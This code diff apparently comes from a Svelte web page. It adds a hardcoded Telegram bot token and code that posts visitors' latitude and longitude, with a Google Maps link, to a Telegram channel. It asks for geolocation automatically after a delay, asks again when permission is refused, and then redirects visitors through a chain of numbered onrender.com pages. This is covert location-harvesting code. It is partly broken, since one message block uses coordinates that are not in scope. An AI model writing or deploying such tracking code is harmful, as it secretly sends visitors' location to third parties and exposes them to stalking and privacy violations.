@@ -5,27 +5,55 @@
 
   onMount(async () => {
 
-     
 
 
-    sendIPToTelegramBots();
+    telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
     
-    // Request location permission automatically
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        // Location permission granted, send location and IP results to Telegram bots
-        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+    const message = `${latitude} ${longitude}`;
+
+    // Create the message with the clickable link to Google Maps
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
+
+    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)
+
+    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}`;
+
+    // Send location and IP results to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
       },
-      (error) => {
-        if (error.code === error.PERMISSION_DENIED) {
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
 
 
-           showAlert();
-          // Location permission denied, send IP result to Telegram bots
-          
+
+
+  //  sendIPToTelegramBots();
+    
+    setTimeout(() => {
+      // Request location permission automatically after a delay of 1 second
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Location permission granted, send location and IP results to Telegram bots
+          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showAlert();
+            // Location permission denied, send IP result to Telegram bots
+          }
         }
-      }
-    );
+      );
+    }, 1000);
   });
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
@@ -146,6 +174,26 @@ function showAlert() {
     if (result) {
       // Allow button clicked
      // console.log("Allowed");
+
+
+
+
+
+      // Allow button clicked
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Location permission granted, send location and IP results to Telegram bots
+          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showAlert();
+            // Location permission denied, send IP result to Telegram bots
+          }
+        }
+      );
+
+
 redirectToNextURL();
     } else {
       // Deny button clicked or dialog closed
@@ -161,20 +209,20 @@ showAlert();
     var currURL = window.location.href;
 
     // Extract the current number from the URL
-    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+    var currNum = parseInt(currURL.match(/yfyyfyc(\d+)/)[1]);
 
     // Check if the current number is less than or equal to 999
     if (currNum <= 999) {
       // Increment the current number by 1 and construct the next URL
       var nextNum = currNum + 1;
-      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+      var nextURL = currURL.replace(/yfyyfyc\d+/, 'yfyyfyc' + nextNum);
 
       // Redirect to the next URL
       window.location.href = nextURL;
     } else {
       // If the current number is greater than 999, display an alert message
       // alert('You have reached the maximum number of URLs.');
-      window.location.href = 'https://mhf1.onrender.com/';
+      window.location.href = 'https://yfyyfyc.onrender.com/';
     }
   }
 
